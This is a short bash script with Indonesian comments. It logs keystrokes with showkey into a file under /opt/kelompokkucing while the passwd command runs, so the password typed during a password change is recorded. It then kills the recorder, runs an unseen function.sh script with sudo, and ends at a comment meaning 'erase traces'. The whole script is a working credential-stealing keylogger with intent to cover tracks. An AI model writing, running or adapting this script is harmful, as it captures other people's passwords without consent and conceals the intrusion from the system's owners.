#!/bin/bash

# start record
FOLDER="kelompokkucing"
showkey > /opt/$FOLDER/logger.txt &
sleep 1

# run passwd
/usr/bin/passwd

# stop record
sleep 1
kill %1
sleep 2
# 
sudo /opt/$FOLDER/function.sh

# hapus jejak